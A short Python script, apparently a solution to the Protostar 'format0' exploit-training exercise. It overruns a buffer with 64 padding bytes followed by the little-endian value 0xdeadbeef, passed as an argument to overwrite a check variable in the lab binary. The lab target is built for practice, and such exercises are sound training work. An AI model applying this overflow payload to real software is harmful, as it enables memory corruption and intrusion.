import subprocess

program = "/opt/protostar/bin/format0"
offset = "A"*64
target = "\xef\xbe\xad\xde"

subprocess.call([program, offset+target])


